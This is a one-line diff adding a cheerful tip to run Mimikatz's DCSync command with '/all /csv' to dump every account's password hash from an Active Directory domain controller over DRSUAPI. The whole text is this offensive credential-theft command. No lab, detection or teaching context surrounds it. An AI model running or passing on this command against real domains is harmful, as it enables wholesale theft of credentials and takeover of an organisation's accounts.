@@ -1,0 +1,1 @@
+Use lsadump::dcsync /all /csv in Mimikatz to perform DRSUAPI grabbing of all hashes! Nice.
